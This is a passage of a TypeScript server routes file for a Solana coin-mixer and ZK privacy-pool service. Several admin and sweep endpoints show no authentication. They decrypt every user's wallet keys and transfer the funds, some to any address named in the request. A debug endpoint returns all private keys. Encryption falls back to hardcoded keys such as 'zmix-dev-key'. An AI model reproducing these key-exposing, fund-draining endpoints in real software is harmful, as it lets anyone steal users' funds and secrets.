      const decryptedBytes = CryptoJS.default.AES.decrypt(record.encryptedKeys, encryptionKey || 'zmix-dev-key');
      const hopWallets = JSON.parse(decryptedBytes.toString(CryptoJS.default.enc.Utf8));
      
      res.json({
        hopWallets,
        hopCount: record.hopCount,
        createdAt: record.createdAt,
        expiresAt: record.expiresAt,
      });
    } catch (error: any) {
      console.error('Error getting recovery data:', error);
      res.status(500).json({ error: 'Failed to get recovery data' });
    }
  });
  
  // Clear recovery data after successful recovery
  app.delete('/api/mixer/recovery/:sessionId', async (req, res) => {
    try {
      const userId = getOrCreateAnonymousId(req.session);
      
      await db.update(hopWalletRecovery)
        .set({ 
          status: 'recovered',
          recoveredAt: new Date(),
        })
        .where(and(
          eq(hopWalletRecovery.sessionId, userId),
          eq(hopWalletRecovery.status, 'pending')
        ));
      
      res.json({ success: true });
    } catch (error: any) {
      console.error('Error clearing recovery data:', error);
      res.status(500).json({ error: 'Failed to clear recovery data' });
    }
  });
  
  // Get pending recovery data for client-side sweep (returns decrypted keys)
  app.post('/api/mixer/recovery/auto-sweep', async (req, res) => {
    try {
      const userId = getOrCreateAnonymousId(req.session);
      
      // Get all pending recovery records for this user
      const records = await db.select()
        .from(hopWalletRecovery)
        .where(and(
          eq(hopWalletRecovery.sessionId, userId),
          eq(hopWalletRecovery.status, 'pending')
        ));
      
      if (records.length === 0) {
        return res.json({ recovered: false, message: 'No pending recovery' });
      }
      
      for (const record of records) {
        // Check if expired
        if (new Date(record.expiresAt) < new Date()) {
          await db.update(hopWalletRecovery)
            .set({ status: 'expired' })
            .where(eq(hopWalletRecovery.id, record.id));
          continue;
        }
        
        try {
          // Decrypt hop wallet keys
          const CryptoJS = await import('crypto-js');
          const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
          if (!encryptionKey) {
            console.warn('SECURITY WARNING: WALLET_ENCRYPTION_KEY not set, using fallback. Set this in production!');
          }
          const decryptedBytes = CryptoJS.default.AES.decrypt(record.encryptedKeys, encryptionKey || 'zmix-dev-key');
          const hopWallets = JSON.parse(decryptedBytes.toString(CryptoJS.default.enc.Utf8));
          
          // Get the destination address from the associated mixer session
          let destinationAddress = PLATFORM_RECOVERY_ADDRESS; // fallback
          if (record.mixSessionId) {
            const [session] = await db.select({ destination: mixerSessions.destinationAddress })
              .from(mixerSessions)
              .where(eq(mixerSessions.id, record.mixSessionId))
              .limit(1);
            if (session?.destination) {
              destinationAddress = session.destination;
            }
          }
          
          // Return hop wallets for client to sweep TO USER'S DESTINATION
          // DON'T mark as recovered yet - client must confirm sweep success
          return res.json({
            recovered: true,
            recordId: record.id,
            hopWallets,
            destinationAddress, // User's original destination from failed session
            platformRecoveryAddress: PLATFORM_RECOVERY_ADDRESS,
          });
        } catch (err) {
          console.error('Failed to process recovery record:', err);
        }
      }
      
      res.json({ recovered: false, message: 'No valid recovery data' });
    } catch (error: any) {
      console.error('Error in auto-sweep:', error);
      res.status(500).json({ error: 'Auto-sweep failed' });
    }
  });
  
  // Confirm successful sweep - only then mark as recovered
  app.post('/api/mixer/recovery/confirm-sweep', async (req, res) => {
    try {
      const { recordId, sweptAmount, signatures } = req.body;
      const userId = getOrCreateAnonymousId(req.session);
      
      if (!recordId) {
        return res.status(400).json({ error: 'Record ID required' });
      }
      
      // Verify ownership and update status
      const updated = await db.update(hopWalletRecovery)
        .set({ 
          status: 'recovered',
          recoveredAt: new Date(),
        })
        .where(and(
          eq(hopWalletRecovery.id, recordId),
          eq(hopWalletRecovery.sessionId, userId),
          eq(hopWalletRecovery.status, 'pending')
        ));
      
      console.log(`Recovery confirmed: ${sweptAmount} SOL swept, signatures: ${signatures?.join(', ')}`);
      res.json({ success: true });
    } catch (error: any) {
      console.error('Error confirming sweep:', error);
      res.status(500).json({ error: 'Failed to confirm sweep' });
    }
  });
  
  // Server-side automatic recovery - executes sweep immediately without client
  app.post('/api/mixer/recovery/execute', async (req, res) => {
    try {
      const userId = getOrCreateAnonymousId(req.session);
      
      // Get all pending recovery records for this user
      const records = await db.select()
        .from(hopWalletRecovery)
        .where(and(
          eq(hopWalletRecovery.sessionId, userId),
          eq(hopWalletRecovery.status, 'pending')
        ));
      
      if (records.length === 0) {
        return res.json({ success: true, recovered: 0, message: 'No pending recovery' });
      }
      
      let totalRecovered = 0;
      const allSignatures: string[] = [];
      
      for (const record of records) {
        // Skip expired records
        if (new Date(record.expiresAt) < new Date()) {
          await db.update(hopWalletRecovery)
            .set({ status: 'expired' })
            .where(eq(hopWalletRecovery.id, record.id));
          continue;
        }
        
        // Get destination from mixer session
        let destinationAddress = PLATFORM_RECOVERY_ADDRESS;
        if (record.mixSessionId) {
          const [session] = await db.select({ destination: mixerSessions.destinationAddress })
            .from(mixerSessions)
            .where(eq(mixerSessions.id, record.mixSessionId))
            .limit(1);
          if (session?.destination) {
            destinationAddress = session.destination;
          }
        }
        
        // Execute server-side sweep
        const result = await executeServerSideSweep(record.encryptedKeys, destinationAddress, record.id);
        if (result.success) {
          totalRecovered += result.totalSwept;
          allSignatures.push(...result.signatures);
        }
      }
      
      res.json({
        success: true,
        recovered: totalRecovered,
        signatures: allSignatures,
        message: totalRecovered > 0 
          ? `Recovered ${totalRecovered.toFixed(6)} SOL` 
          : 'No funds found in pending recovery wallets'
      });
    } catch (error: any) {
      console.error('Execute recovery error:', error);
      res.status(500).json({ error: 'Recovery failed: ' + error.message });
    }
  });
  
  // Admin endpoint: Sweep ALL pending recovery records (regardless of session)
  // This is for recovering stuck funds from all users
  app.post('/api/mixer/recovery/sweep-all', async (req, res) => {
    try {
      // Get ALL pending recovery records (no session filter)
      const records = await db.select()
        .from(hopWalletRecovery)
        .where(eq(hopWalletRecovery.status, 'pending'));
      
      if (records.length === 0) {
        return res.json({ success: true, recovered: 0, message: 'No pending recovery records' });
      }
      
      console.log(`Sweep-all: Processing ${records.length} pending recovery records`);
      
      let totalRecovered = 0;
      const allSignatures: string[] = [];
      const processedRecords: string[] = [];
      
      for (const record of records) {
        // Skip expired records
        if (new Date(record.expiresAt) < new Date()) {
          await db.update(hopWalletRecovery)
            .set({ status: 'expired' })
            .where(eq(hopWalletRecovery.id, record.id));
          continue;
        }
        
        // Get destination from mixer session OR pool deposit
        let destinationAddress = PLATFORM_RECOVERY_ADDRESS;
        if (record.mixSessionId) {
          // First try mixer sessions
          const [session] = await db.select({ destination: mixerSessions.destinationAddress })
            .from(mixerSessions)
            .where(eq(mixerSessions.id, record.mixSessionId))
            .limit(1);
          if (session?.destination) {
            destinationAddress = session.destination;
          } else {
            // Try pool deposits (for pool withdrawal recovery)
            const [deposit] = await db.select({ destination: zkPoolDeposits.destinationAddress })
              .from(zkPoolDeposits)
              .where(eq(zkPoolDeposits.id, record.mixSessionId))
              .limit(1);
            if (deposit?.destination) {
              destinationAddress = deposit.destination;
            }
          }
        }
        
        console.log(`Sweep-all: Sweeping record ${record.id} to ${destinationAddress}`);
        
        // Execute server-side sweep
        const result = await executeServerSideSweep(record.encryptedKeys, destinationAddress, record.id);
        if (result.success) {
          totalRecovered += result.totalSwept;
          allSignatures.push(...result.signatures);
          processedRecords.push(record.id);
        }
      }
      
      res.json({
        success: true,
        recovered: totalRecovered,
        signatures: allSignatures,
        processedRecords,
        message: totalRecovered > 0 
          ? `Recovered ${totalRecovered.toFixed(6)} SOL from ${processedRecords.length} records` 
          : 'No funds found in any pending recovery wallets'
      });
    } catch (error: any) {
      console.error('Sweep-all error:', error);
      res.status(500).json({ error: 'Sweep-all failed: ' + error.message });
    }
  });
  
  // EMERGENCY RECOVERY: Scan ALL backup records and sweep any funds to destination
  // This checks ALL records regardless of status (pending, completed_empty, recovered)
  app.post('/api/admin/emergency-sweep', async (req, res) => {
    try {
      const { destinationAddress } = req.body;
      
      if (!destinationAddress) {
        return res.status(400).json({ error: 'Destination address required' });
      }
      
      const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = await import('@solana/web3.js');
      const bs58 = await import('bs58');
      const CryptoJS = await import('crypto-js');
      
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
      const destPubkey = new PublicKey(destinationAddress);
      
      // Get ALL recovery records regardless of status
      const records = await db.select()
        .from(hopWalletRecovery);
      
      console.log(`EMERGENCY SWEEP: Scanning ${records.length} total recovery records`);
      
      let totalRecovered = 0;
      const signatures: string[] = [];
      const walletsWithFunds: { address: string; balance: number }[] = [];
      let walletsChecked = 0;
      
      for (const record of records) {
        try {
          const decryptedBytes = CryptoJS.default.AES.decrypt(record.encryptedKeys, encryptionKey || 'zmix-dev-key');
          const hopWallets = JSON.parse(decryptedBytes.toString(CryptoJS.default.enc.Utf8));
          
          for (const wallet of hopWallets) {
            walletsChecked++;
            
            // Rate limit - 500ms between balance checks
            await sleep(500);
            
            const secretKey = bs58.default.decode(wallet.secretKey);
            const keypair = Keypair.fromSecretKey(secretKey);
            
            let balance = 0;
            try {
              balance = await connection.getBalance(keypair.publicKey);
            } catch (e: any) {
              if (e.message?.includes('429')) {
                await sleep(5000); // Wait 5s on rate limit
                balance = await connection.getBalance(keypair.publicKey);
              }
            }
            
            const minBalance = 10000; // 0.00001 SOL minimum to sweep
            
            if (balance > minBalance) {
              console.log(`Found funds: ${keypair.publicKey.toBase58()} has ${balance / LAMPORTS_PER_SOL} SOL`);
              walletsWithFunds.push({ address: keypair.publicKey.toBase58(), balance: balance / LAMPORTS_PER_SOL });
              
              // Sweep the funds
              const txFee = 5000;
              const amountToSend = balance - txFee;
              
              if (amountToSend > 0) {
                await sleep(1000);
                
                const transaction = new Transaction().add(
                  SystemProgram.transfer({
                    fromPubkey: keypair.publicKey,
                    toPubkey: destPubkey,
                    lamports: amountToSend,
                  })
                );
                
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = keypair.publicKey;
                transaction.sign(keypair);
                
                await sleep(500);
                const sig = await connection.sendRawTransaction(transaction.serialize());
                await sleep(1000);
                await connection.confirmTransaction(sig, 'confirmed');
                
                totalRecovered += amountToSend / LAMPORTS_PER_SOL;
                signatures.push(sig);
                console.log(`SWEPT: ${amountToSend / LAMPORTS_PER_SOL} SOL from ${keypair.publicKey.toBase58()}, sig: ${sig}`);
              }
            }
          }
        } catch (err: any) {
          console.error('Failed to process record:', record.id, err.message);
        }
      }
      
      res.json({
        success: true,
        walletsChecked,
        walletsWithFunds,
        totalRecovered,
        signatures,
        destination: destinationAddress,
        message: totalRecovered > 0 
          ? `Recovered ${totalRecovered.toFixed(6)} SOL to ${destinationAddress}`
          : `Checked ${walletsChecked} wallets, no funds found`
      });
    } catch (error: any) {
      console.error('Emergency sweep error:', error);
      res.status(500).json({ error: error.message });
    }
  });
  
  // Debug endpoint: List all hop wallet addresses with balances
  app.get('/api/admin/recovery-debug', async (req, res) => {
    try {
      const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = await import('@solana/web3.js');
      const bs58 = await import('bs58');
      const CryptoJS = await import('crypto-js');
      
      // Check ALL records, not just pending
      const records = await db.select()
        .from(hopWalletRecovery);
      
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY;
      const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
      
      const allWallets: { recordId: string; address: string; balance: number; secretKey: string }[] = [];
      
      for (const record of records) {
        try {
          const decryptedBytes = CryptoJS.default.AES.decrypt(record.encryptedKeys, encryptionKey || 'zmix-dev-key');
          const hopWallets = JSON.parse(decryptedBytes.toString(CryptoJS.default.enc.Utf8));
          
          for (const wallet of hopWallets) {
            const secretKey = bs58.default.decode(wallet.secretKey);
            const keypair = Keypair.fromSecretKey(secretKey);
            const balance = await connection.getBalance(keypair.publicKey);
            
            allWallets.push({
              recordId: record.id,
              address: keypair.publicKey.toBase58(),
              balance: balance / LAMPORTS_PER_SOL,
              secretKey: wallet.secretKey,
            });
          }
        } catch (err) {
          console.error('Failed to decrypt record:', record.id, err);
        }
      }
      
      // Also check the pool withdrawal recipient wallets directly
      const withdrawalRecords = await db.select()
        .from(zkPoolWithdrawals)
        .where(eq(zkPoolWithdrawals.status, 'completed'));
      
      const withdrawalWallets = [];
      for (const wd of withdrawalRecords) {
        try {
          const balance = await connection.getBalance(new PublicKey(wd.recipientAddress));
          withdrawalWallets.push({
            depositId: wd.depositId,
            address: wd.recipientAddress,
            balance: balance / LAMPORTS_PER_SOL,
          });
        } catch {}
      }
      
      res.json({
        hopWallets: allWallets,
        withdrawalWallets,
        totalHopBalance: allWallets.reduce((sum, w) => sum + w.balance, 0),
        totalWithdrawalBalance: withdrawalWallets.reduce((sum, w) => sum + w.balance, 0),
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Sweep hop wallets directly from mixer_sessions table (unencrypted keys)
  app.post('/api/admin/sweep-mixer-sessions', async (req, res) => {
    try {
      const { destinationAddress } = req.body;
      
      if (!destinationAddress) {
        return res.status(400).json({ error: 'Destination address required' });
      }
      
      const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = await import('@solana/web3.js');
      const bs58 = await import('bs58');
      
      const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
      const destPubkey = new PublicKey(destinationAddress);
      
      // Get all mixer sessions with hop_wallets
      const sessions = await db.select()
        .from(mixerSessions)
        .where(isNotNull(mixerSessions.hopWallets));
      
      console.log(`SWEEP MIXER SESSIONS: Scanning ${sessions.length} sessions with hop wallets`);
      
      let totalRecovered = 0;
      const signatures: string[] = [];
      const walletsWithFunds: { address: string; balance: number }[] = [];
      let walletsChecked = 0;
      
      for (const session of sessions) {
        try {
          const hopWallets = session.hopWallets as any[];
          if (!hopWallets || !Array.isArray(hopWallets)) continue;
          
          for (const wallet of hopWallets) {
            walletsChecked++;
            
            // Rate limit
            await sleep(500);
            
            const secretKey = bs58.default.decode(wallet.secretKey);
            const keypair = Keypair.fromSecretKey(secretKey);
            
            let balance = 0;
            try {
              balance = await connection.getBalance(keypair.publicKey);
            } catch (e: any) {
              if (e.message?.includes('429')) {
                await sleep(5000);
                balance = await connection.getBalance(keypair.publicKey);
              }
            }
            
            const minBalance = 10000;
            
            if (balance > minBalance) {
              console.log(`Found funds in mixer session: ${keypair.publicKey.toBase58()} has ${balance / LAMPORTS_PER_SOL} SOL`);
              walletsWithFunds.push({ address: keypair.publicKey.toBase58(), balance: balance / LAMPORTS_PER_SOL });
              
              const txFee = 5000;
              const amountToSend = balance - txFee;
              
              if (amountToSend > 0) {
                await sleep(1000);
                
                const transaction = new Transaction().add(
                  SystemProgram.transfer({
                    fromPubkey: keypair.publicKey,
                    toPubkey: destPubkey,
                    lamports: amountToSend,
                  })
                );
                
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = keypair.publicKey;
                transaction.sign(keypair);
                
                await sleep(500);
                const sig = await connection.sendRawTransaction(transaction.serialize());
                await sleep(1000);
                await connection.confirmTransaction(sig, 'confirmed');
                
                totalRecovered += amountToSend / LAMPORTS_PER_SOL;
                signatures.push(sig);
                console.log(`SWEPT from mixer session: ${amountToSend / LAMPORTS_PER_SOL} SOL from ${keypair.publicKey.toBase58()}, sig: ${sig}`);
              }
            }
          }
        } catch (err: any) {
          console.error('Failed to process session:', session.id, err.message);
        }
      }
      
      res.json({
        success: true,
        sessionsChecked: sessions.length,
        walletsChecked,
        walletsWithFunds,
        totalRecovered,
        signatures,
        destination: destinationAddress,
        message: totalRecovered > 0 
          ? `Recovered ${totalRecovered.toFixed(6)} SOL to ${destinationAddress}`
          : `Checked ${walletsChecked} wallets from ${sessions.length} sessions, no funds found`
      });
    } catch (error: any) {
      console.error('Sweep mixer sessions error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Sweep user burner wallets (encrypted private keys in wallets table)
  app.post('/api/admin/sweep-burner-wallets', async (req, res) => {
    try {
      const { destinationAddress } = req.body;
      
      if (!destinationAddress) {
        return res.status(400).json({ error: 'Destination address required' });
      }
      
      const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = await import('@solana/web3.js');
      const bs58 = await import('bs58');
      const { decryptPrivateKey } = await import('./lib/encryption');
      
      const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
      const destPubkey = new PublicKey(destinationAddress);
      
      // Get all wallets from the wallets table
      const allWallets = await db.select().from(wallets);
      
      console.log(`SWEEP BURNER WALLETS: Scanning ${allWallets.length} wallets`);
      
      let totalRecovered = 0;
      const signatures: string[] = [];
      const walletsWithFunds: { address: string; balance: number }[] = [];
      let walletsChecked = 0;
      
      for (const wallet of allWallets) {
        try {
          walletsChecked++;
          
          // Rate limit
          await sleep(500);
          
          // Use the proper decryption function
          const secretKeyStr = decryptPrivateKey(wallet.encryptedPrivateKey);
          
          if (!secretKeyStr) {
            console.log(`Could not decrypt wallet ${wallet.publicKey}`);
            continue;
          }
          
          const secretKey = bs58.default.decode(secretKeyStr);
          const keypair = Keypair.fromSecretKey(secretKey);
          
          let balance = 0;
          try {
            balance = await connection.getBalance(keypair.publicKey);
          } catch (e: any) {
            if (e.message?.includes('429')) {
              await sleep(5000);
              balance = await connection.getBalance(keypair.publicKey);
            }
          }
          
          const minBalance = 10000;
          
          if (balance > minBalance) {
            console.log(`Found funds in burner wallet: ${keypair.publicKey.toBase58()} has ${balance / LAMPORTS_PER_SOL} SOL`);
            walletsWithFunds.push({ address: keypair.publicKey.toBase58(), balance: balance / LAMPORTS_PER_SOL });
            
            const txFee = 5000;
            const amountToSend = balance - txFee;
            
            if (amountToSend > 0) {
              await sleep(1000);
              
              const transaction = new Transaction().add(
                SystemProgram.transfer({
                  fromPubkey: keypair.publicKey,
                  toPubkey: destPubkey,
                  lamports: amountToSend,
                })
              );
              
              const { blockhash } = await connection.getLatestBlockhash();
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = keypair.publicKey;
              transaction.sign(keypair);
              
              await sleep(500);
              const sig = await connection.sendRawTransaction(transaction.serialize());
              await sleep(1000);
              await connection.confirmTransaction(sig, 'confirmed');
              
              totalRecovered += amountToSend / LAMPORTS_PER_SOL;
              signatures.push(sig);
              console.log(`SWEPT from burner wallet: ${amountToSend / LAMPORTS_PER_SOL} SOL from ${keypair.publicKey.toBase58()}, sig: ${sig}`);
            }
          }
        } catch (err: any) {
          console.error('Failed to process wallet:', wallet.publicKey, err.message);
        }
      }
      
      res.json({
        success: true,
        walletsChecked,
        walletsWithFunds,
        totalRecovered,
        signatures,
        destination: destinationAddress,
        message: totalRecovered > 0 
          ? `Recovered ${totalRecovered.toFixed(6)} SOL to ${destinationAddress}`
          : `Checked ${walletsChecked} wallets, no funds found`
      });
    } catch (error: any) {
      console.error('Sweep burner wallets error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // ==================== Privacy Pool Mixer Routes ====================

  // Get pool statistics and anonymity set info
  app.get('/api/pool/stats', async (req, res) => {
    try {
      const { getPoolStats, DEPOSIT_TIERS } = await import('./lib/zk/depositPool');
      const stats = await getPoolStats();
      
      res.json({
        ...stats,
        tiers: Object.entries(DEPOSIT_TIERS).map(([key, config]) => ({
          id: key,
          sol: config.sol,
          label: config.label,
          anonymitySet: stats.anonymitySetByTier[config.label] || 0,
        })),
      });
    } catch (error: any) {
      console.error('Pool stats error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Create a pool deposit (returns note and pool address)
  app.post('/api/pool/deposit', zkLimiter, async (req, res) => {
    try {
      const { tier } = req.body;
      
      if (!tier) {
        return res.status(400).json({ error: 'Deposit tier required' });
      }
      
      const { createPoolDeposit, DEPOSIT_TIERS } = await import('./lib/zk/depositPool');
      
      if (!DEPOSIT_TIERS[tier as keyof typeof DEPOSIT_TIERS]) {
        return res.status(400).json({ 
          error: 'Invalid tier. Valid tiers: ' + Object.keys(DEPOSIT_TIERS).join(', ') 
        });
      }
      
      const result = await createPoolDeposit(tier);
      
      if (!result.success) {
        return res.status(400).json({ error: result.error });
      }
      
      res.json({
        success: true,
        poolAddress: result.poolAddress,
        requiredAmount: result.requiredAmount,
        deposit: {
          commitment: result.note!.commitment,
          nullifierHash: result.note!.nullifierHash,
          leafIndex: result.note!.leafIndex,
        },
        note: {
          secret: result.note!.secret,
          nullifierSeed: result.note!.nullifierSeed,
          amount: result.note!.amount,
          commitment: result.note!.commitment,
          nullifierHash: result.note!.nullifierHash,
          leafIndex: result.note!.leafIndex,
          timestamp: result.note!.timestamp,
        },
      });
    } catch (error: any) {
      console.error('Pool deposit error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Verify a deposit transaction on-chain
  app.post('/api/pool/verify-deposit', zkLimiter, async (req, res) => {
    try {
      const { txSignature, commitment, tier } = req.body;
      
      if (!txSignature || !commitment || !tier) {
        return res.status(400).json({ error: 'Missing txSignature, commitment, or tier' });
      }
      
      const { verifyDepositTransaction, DEPOSIT_TIERS } = await import('./lib/zk/depositPool');
      
      const tierConfig = DEPOSIT_TIERS[tier as keyof typeof DEPOSIT_TIERS];
      if (!tierConfig) {
        return res.status(400).json({ error: 'Invalid tier' });
      }
      
      const result = await verifyDepositTransaction(txSignature, tierConfig.lamports, commitment);
      
      res.json(result);
    } catch (error: any) {
      console.error('Verify deposit error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Process a withdrawal (relayer endpoint)
  app.post('/api/pool/withdraw', zkLimiter, async (req, res) => {
    try {
      const { note, recipient, relayerFee } = req.body;
      
      if (!note || !recipient) {
        return res.status(400).json({ error: 'Missing note or recipient' });
      }
      
      const { processWithdrawal, isNullifierSpent } = await import('./lib/zk/depositPool');
      
      // Check if already spent
      const isSpent = await isNullifierSpent(note.nullifierHash);
      if (isSpent) {
        return res.status(400).json({ error: 'This deposit has already been withdrawn (nullifier spent)' });
      }
      
      const result = await processWithdrawal(note, recipient, relayerFee);
      
      if (!result.success) {
        return res.status(400).json({ error: result.error });
      }
      
      res.json({
        success: true,
        amountReceived: result.amountReceived,
        platformFee: result.platformFee,
        relayerFee: result.relayerFee,
        message: 'Withdrawal processed. The relayer will execute the transaction.',
      });
    } catch (error: any) {
      console.error('Pool withdraw error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Check commitment status
  app.get('/api/pool/commitment/:commitment', async (req, res) => {
    try {
      const { commitment } = req.params;
      
      const { getCommitmentStatus } = await import('./lib/zk/depositPool');
      const status = await getCommitmentStatus(commitment);
      
      res.json(status);
    } catch (error: any) {
      console.error('Commitment status error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Check nullifier status (double-spend check)
  app.get('/api/pool/nullifier/:nullifier', async (req, res) => {
    try {
      const { nullifier } = req.params;
      
      const { isNullifierSpent } = await import('./lib/zk/depositPool');
      const spent = await isNullifierSpent(nullifier);
      
      res.json({ spent });
    } catch (error: any) {
      console.error('Nullifier status error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // ==================== Zero-Knowledge Proof Routes ====================

  // Create a ZK deposit commitment (legacy - use /api/pool/deposit instead)
  app.post('/api/zk/deposit', zkLimiter, async (req, res) => {
    try {
      const { amount } = req.body;
      
      if (!amount || parseFloat(amount) <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
      }
      
      const { createZKDeposit } = await import('./lib/zk');
      const amountLamports = BigInt(Math.floor(parseFloat(amount) * 1e9));
      const deposit = await createZKDeposit(amountLamports);
      
      res.json({
        success: true,
        deposit: {
          commitment: deposit.commitment,
          nullifierHash: deposit.nullifierHash,
          leafIndex: deposit.leafIndex,
          timestamp: deposit.timestamp,
        },
        note: {
          secret: deposit.secret,
          nullifierSeed: deposit.nullifierSeed,
          amount: deposit.amount,
        },
      });
    } catch (error: any) {
      console.error('ZK deposit error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Generate ZK withdrawal proof
  app.post('/api/zk/withdraw', zkLimiter, async (req, res) => {
    try {
      const { note, recipient, relayer, relayerFee } = req.body;
      
      if (!note || !recipient) {
        return res.status(400).json({ error: 'Missing note or recipient' });
      }
      
      const { generateWithdrawalProof } = await import('./lib/zk');
      const result = await generateWithdrawalProof({
        note,
        recipient,
        relayer,
        relayerFee,
      });
      
      if (!result.success) {
        return res.status(400).json({ error: result.error });
      }
      
      res.json({
        success: true,
        proof: result.proof,
        merkleProof: result.merkleProof,
      });
    } catch (error: any) {
      console.error('ZK withdrawal error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Verify ZK proof
  app.post('/api/zk/verify', zkLimiter, async (req, res) => {
    try {
      const { proof } = req.body;
      
      if (!proof) {
        return res.status(400).json({ error: 'Missing proof' });
      }
      
      const { verifyWithdrawalProof } = await import('./lib/zk');
      const result = await verifyWithdrawalProof(proof);
      
      res.json(result);
    } catch (error: any) {
      console.error('ZK verify error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Get Merkle tree state
  app.get('/api/zk/tree', async (req, res) => {
    try {
      const { getMerkleTreeState } = await import('./lib/zk');
      const state = await getMerkleTreeState();
      
      res.json(state);
    } catch (error: any) {
      console.error('ZK tree error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Calculate ZK privacy score
  app.post('/api/zk/privacy-score', zkLimiter, async (req, res) => {
    try {
      const { hopCount, delaySeconds, hasZKProof, merkleTreeSize } = req.body;
      
      const { calculateZKPrivacyScore } = await import('./lib/zk');
      const result = calculateZKPrivacyScore({
        hopCount: hopCount || 2,
        delaySeconds: delaySeconds || 0,
        hasZKProof: hasZKProof ?? true,
        merkleTreeSize: merkleTreeSize || 1,
      });
      
      res.json(result);
    } catch (error: any) {
      console.error('ZK privacy score error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Prepare proof for on-chain verification
  app.post('/api/zk/prepare-onchain', async (req, res) => {
    try {
      const { proof } = req.body;
      
      if (!proof) {
        return res.status(400).json({ error: 'Missing proof' });
      }
      
      const { prepareOnChainVerification } = await import('./lib/zk');
      const result = await prepareOnChainVerification(proof);
      
      res.json({
        encodedProof: {
          pi_a: Array.from(result.encodedProof.pi_a),
          pi_b: Array.from(result.encodedProof.pi_b),
          pi_c: Array.from(result.encodedProof.pi_c),
          publicInputsCount: result.encodedProof.publicInputs.length,
        },
        verificationKey: {
          protocol: result.verificationKey.protocol,
          curve: result.verificationKey.curve,
          nPublic: result.verificationKey.nPublic,
          ceremonyHash: result.verificationKey.ceremonyHash,
        },
        estimatedCost: result.estimatedCost,
      });
    } catch (error: any) {
      console.error('ZK prepare onchain error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Get Solana verifier program info
  app.get('/api/zk/verifier-info', async (req, res) => {
    try {
      const { VERIFIER_PROGRAM_ID, generateVerifierProgramSource, estimateVerificationCost } = await import('./lib/zk/solanaVerifier');
      
      res.json({
        programId: VERIFIER_PROGRAM_ID.toBase58(),
        estimatedCost: estimateVerificationCost(),
        features: [
          'Groth16 proof verification',
          'Alt_bn128 pairing checks',
          'Nullifier registry',
          'Merkle root validation',
        ],
      });
    } catch (error: any) {
      console.error('ZK verifier info error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // ==================== Integrated Privacy Pool Mixer Routes ====================
  // These routes combine the ZK privacy pool with multi-hop for maximum privacy

  // Create a privacy pool deposit intent (starts the integrated mixing flow)
  app.post('/api/privacy-pool/deposit', zkLimiter, async (req, res) => {
    try {
      const sessionId = getOrCreateAnonymousId(req.session);
      if (!sessionId) {
        return res.status(401).json({ error: 'Session required' });
      }

      const { tier, destinationAddress, anonymityDelay } = req.body;
      
      if (!tier || !destinationAddress) {
        return res.status(400).json({ error: 'Missing tier or destinationAddress' });
      }

      // Validate tier
      const { DEPOSIT_TIERS, createPoolDeposit } = await import('./lib/zk/depositPool');
      const tierConfig = DEPOSIT_TIERS[tier as keyof typeof DEPOSIT_TIERS];
      if (!tierConfig) {
        return res.status(400).json({ 
          error: 'Invalid tier', 
          validTiers: Object.keys(DEPOSIT_TIERS) 
        });
      }

      // Validate destination address
      const { PublicKey } = await import('@solana/web3.js');
      try {
        new PublicKey(destinationAddress);
      } catch {
        return res.status(400).json({ error: 'Invalid destination address' });
      }

      // Create ZK commitment
      const depositResult = await createPoolDeposit(tier as keyof typeof DEPOSIT_TIERS);
      if (!depositResult.success || !depositResult.note) {
        return res.status(500).json({ error: depositResult.error || 'Failed to create deposit' });
      }

      // Encrypt the note for server-side storage
      const CryptoJSModule = await import('crypto-js');
      const CryptoJS = CryptoJSModule.default || CryptoJSModule;
      const encryptionKey = process.env.WALLET_ENCRYPTION_KEY || 'default-key';
      const encryptedNote = CryptoJS.AES.encrypt(
        JSON.stringify(depositResult.note), 
        encryptionKey
      ).toString();

      // Calculate withdraw time (minimum 5 minutes, default 10 minutes)
      const delaySeconds = Math.max(300, anonymityDelay || 600);
      const withdrawAfter = new Date(Date.now() + delaySeconds * 1000);

      // Store deposit intent in database
      const [deposit] = await db.insert(zkPoolDeposits).values({
        sessionId,
        tier,
        amountSol: tierConfig.sol.toString(),
        commitmentHash: depositResult.note.commitment,
        encryptedNote,
        status: 'pending',
        anonymityDelay: delaySeconds,
        withdrawAfter,
        destinationAddress,
      }).returning();

      res.json({
        success: true,
        depositId: deposit.id,
        tier: tierConfig.label,
        amountSol: tierConfig.sol,
        poolAddress: depositResult.poolAddress,
        commitmentHash: depositResult.note.commitment,
        withdrawAfter: withdrawAfter.toISOString(),
        anonymityDelaySeconds: delaySeconds,
        note: depositResult.note, // Client should save this securely
      });
    } catch (error: any) {
      console.error('Privacy pool deposit error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  // Confirm deposit transaction on-chain
  app.post('/api/privacy-pool/confirm-deposit', zkLimiter, async (req, res) => {
    try {
      const sessionId = getOrCreateAnonymousId(req.session);
      const { depositId, txSignature } = req.body;

      if (!depositId || !txSignature) {
